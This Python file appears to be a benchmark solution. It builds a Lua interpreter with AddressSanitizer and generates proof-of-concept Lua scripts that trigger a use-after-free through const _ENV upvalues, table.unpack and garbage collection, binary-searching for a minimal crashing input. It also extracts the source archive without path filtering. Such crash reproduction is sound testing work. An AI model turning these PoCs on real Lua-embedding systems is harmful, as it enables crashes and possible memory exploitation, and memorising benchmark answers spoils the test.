import os
import re
import tarfile
import tempfile
import subprocess
import time
from typing import Optional, Callable, List


def _is_exe(path: str) -> bool:
    try:
        st = os.stat(path)
    except OSError:
        return False
    if not os.path.isfile(path):
        return False
    if os.name == "nt":
        return path.lower().endswith(".exe")
    return bool(st.st_mode & 0o111)


def _find_lua_binary(root: str) -> Optional[str]:
    direct = [
        os.path.join(root, "src", "lua"),
        os.path.join(root, "lua"),
        os.path.join(root, "bin", "lua"),
        os.path.join(root, "build", "lua"),
    ]
    for p in direct:
        if _is_exe(p):
            return p

    for dirpath, dirnames, filenames in os.walk(root):
        for fn in filenames:
            if fn == "lua" or fn == "lua.exe":
                p = os.path.join(dirpath, fn)
                if _is_exe(p):
                    return p
    return None


def _extract_tarball(src_path: str, dst_dir: str) -> str:
    if os.path.isdir(src_path):
        return os.path.abspath(src_path)

    with tarfile.open(src_path, "r:*") as tf:
        tf.extractall(dst_dir)

    entries = [os.path.join(dst_dir, x) for x in os.listdir(dst_dir)]
    dirs = [p for p in entries if os.path.isdir(p)]
    if len(dirs) == 1:
        return os.path.abspath(dirs[0])
    return os.path.abspath(dst_dir)


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def _build_lua(root: str, deadline: float) -> Optional[str]:
    makefile = os.path.join(root, "Makefile")
    src_makefile = os.path.join(root, "src", "Makefile")
    cmake = os.path.join(root, "CMakeLists.txt")
    env = os.environ.copy()

    cflags = env.get("CFLAGS", "")
    ldflags = env.get("LDFLAGS", "")
    asan_cflags = "-O1 -g -fsanitize=address -fno-omit-frame-pointer"
    asan_ldflags = "-fsanitize=address"
    env["CFLAGS"] = (cflags + " " + asan_cflags).strip()
    env["LDFLAGS"] = (ldflags + " " + asan_ldflags).strip()
    env["MYCFLAGS"] = asan_cflags
    env["MYLDFLAGS"] = asan_ldflags

    if os.path.isfile(makefile) or os.path.isfile(src_makefile):
        for tgt in ("generic", "posix", "linux", ""):
            if time.time() > deadline:
                break
            try:
                if tgt:
                    r = _run(["make", "-j8", tgt], cwd=root, env=env, timeout=max(10, int(deadline - time.time())))
                else:
                    r = _run(["make", "-j8"], cwd=root, env=env, timeout=max(10, int(deadline - time.time())))
            except Exception:
                continue
            if r.returncode == 0:
                lua = _find_lua_binary(root)
                if lua:
                    return lua

        if os.path.isfile(src_makefile):
            for tgt in ("", "generic", "posix", "linux"):
                if time.time() > deadline:
                    break
                try:
                    if tgt:
                        r = _run(["make", "-j8", tgt], cwd=os.path.join(root, "src"), env=env, timeout=max(10, int(deadline - time.time())))
                    else:
                        r = _run(["make", "-j8"], cwd=os.path.join(root, "src"), env=env, timeout=max(10, int(deadline - time.time())))
                except Exception:
                    continue
                if r.returncode == 0:
                    lua = _find_lua_binary(root)
                    if lua:
                        return lua

    if os.path.isfile(cmake):
        if time.time() <= deadline:
            build_dir = os.path.join(root, "build_asan")
            os.makedirs(build_dir, exist_ok=True)
            try:
                gen = _run(
                    ["cmake", "-DCMAKE_BUILD_TYPE=RelWithDebInfo", f"-DCMAKE_C_FLAGS={asan_cflags}", f"-DCMAKE_EXE_LINKER_FLAGS={asan_ldflags}", ".."],
                    cwd=build_dir,
                    env=env,
                    timeout=max(10, int(deadline - time.time())),
                )
                if gen.returncode == 0 and time.time() <= deadline:
                    bld = _run(["cmake", "--build", ".", "--parallel", "8"], cwd=build_dir, env=env, timeout=max(10, int(deadline - time.time())))
                    if bld.returncode == 0:
                        lua = _find_lua_binary(root)
                        if lua:
                            return lua
            except Exception:
                pass

    return None


def _is_sanitizer_crash(returncode: int, out: bytes) -> bool:
    if returncode < 0:
        return True
    if returncode == 0:
        return False
    s = out
    if b"ERROR: AddressSanitizer" in s:
        return True
    if b"heap-use-after-free" in s or b"use-after-free" in s:
        return True
    if b"UndefinedBehaviorSanitizer" in s or b"runtime error:" in s:
        return True
    if b"Sanitizer" in s and (b"ERROR" in s or b"SEGV" in s or b"ABORTING" in s):
        return True
    return False


def _run_lua(lua_path: str, script: bytes, timeout_sec: float = 2.0) -> tuple[int, bytes]:
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
    opts = env["ASAN_OPTIONS"].split(":") if env["ASAN_OPTIONS"] else []
    need = {
        "detect_leaks": "0",
        "abort_on_error": "1",
        "allocator_may_return_null": "1",
        "handle_segv": "1",
        "handle_sigbus": "1",
        "handle_abort": "1",
        "disable_coredump": "1",
    }
    existing = {}
    for o in opts:
        if "=" in o:
            k, v = o.split("=", 1)
            existing[k] = v
    for k, v in need.items():
        if k not in existing:
            opts.append(f"{k}={v}")
    env["ASAN_OPTIONS"] = ":".join([o for o in opts if o])

    with tempfile.NamedTemporaryFile(prefix="poc_", suffix=".lua", delete=False) as f:
        path = f.name
        f.write(script)
    try:
        try:
            r = subprocess.run(
                [lua_path, path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                timeout=timeout_sec,
                check=False,
            )
            out = (r.stdout or b"") + b"\n" + (r.stderr or b"")
            return r.returncode, out
        except subprocess.TimeoutExpired as e:
            out = (e.stdout or b"") + b"\n" + (e.stderr or b"")
            return 124, out
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def _template_block_env_unpack(N: int) -> bytes:
    s = f"""\
local function sink(...) return select('#', ...) end
local function run(N)
  local ok = pcall(function()
    do
      local _ENV <const> = setmetatable({{}}, {{__index=_G}})
      F = function()
        return tostring(1234), type("x"), _ENV
      end
      local t = {{}}
      for i=1,N do t[i]=i end
      sink(table.unpack(t))
    end
    collectgarbage("collect")
    F()
  end)
  return ok
end
run({N})
"""
    return s.encode("utf-8")


def _template_function_env_unpack(N: int) -> bytes:
    s = f"""\
local function sink(...) return select('#', ...) end
local function maker(N)
  local _ENV <const> = setmetatable({{}}, {{__index=_G}})
  local function f()
    return tostring(1), _ENV, print
  end
  local t = {{}}
  for i=1,N do t[i]=i end
  sink(table.unpack(t))
  return f
end

local ok = pcall(function()
  local g = maker({N})
  collectgarbage("collect")
  g()
end)
"""
    return s.encode("utf-8")


def _template_nested_env_unpack(N: int) -> bytes:
    s = f"""\
local function sink(...) return select('#', ...) end
local function outer(N)
  local _ENV <const> = setmetatable({{}}, {{__index=_G}})
  local function mid()
    local function inner()
      return tostring(999), _ENV, table, math
    end
    return inner
  end
  local f = mid()
  local t = {{}}
  for i=1,N do t[i]=i end
  sink(table.unpack(t))
  return f
end

pcall(function()
  local f = outer({N})
  collectgarbage("collect")
  f()
end)
"""
    return s.encode("utf-8")


def _find_crash_for_template(lua_path: str, tmpl: Callable[[int], bytes], Ns: List[int], deadline: float) -> Optional[bytes]:
    last_n = None
    for n in Ns:
        if time.time() > deadline:
            return None
        script = tmpl(n)
        rc, out = _run_lua(lua_path, script, timeout_sec=2.5)
        if _is_sanitizer_crash(rc, out):
            hi = n
            lo = 0 if last_n is None else last_n
            best = script
            # Binary search to reduce N
            l = lo + 1
            r = hi
            while l <= r and time.time() <= deadline:
                m = (l + r) // 2
                sc = tmpl(m)
                rc2, out2 = _run_lua(lua_path, sc, timeout_sec=2.5)
                if _is_sanitizer_crash(rc2, out2):
                    best = sc
                    r = m - 1
                else:
                    l = m + 1
            return best
        last_n = n
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = _template_block_env_unpack(2000)
        start = time.time()
        deadline = start + 55.0

        try:
            with tempfile.TemporaryDirectory(prefix="lua_src_") as td:
                root = _extract_tarball(src_path, td)
                lua_path = _build_lua(root, deadline)
                if not lua_path:
                    return fallback

                # Try fixed set first with moderate N
                quick = [
                    _template_block_env_unpack(1200),
                    _template_function_env_unpack(1200),
                    _template_nested_env_unpack(1200),
                    _template_block_env_unpack(2000),
                    _template_function_env_unpack(2000),
                    _template_nested_env_unpack(2000),
                ]
                for sc in quick:
                    if time.time() > deadline:
                        break
                    rc, out = _run_lua(lua_path, sc, timeout_sec=2.5)
                    if _is_sanitizer_crash(rc, out):
                        return sc

                Ns = [64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048, 3072, 4096, 6144]
                for tmpl in (_template_block_env_unpack, _template_function_env_unpack, _template_nested_env_unpack):
                    if time.time() > deadline:
                        break
                    res = _find_crash_for_template(lua_path, tmpl, Ns, deadline)
                    if res is not None:
                        return res

                return fallback
        except Exception:
            return fallback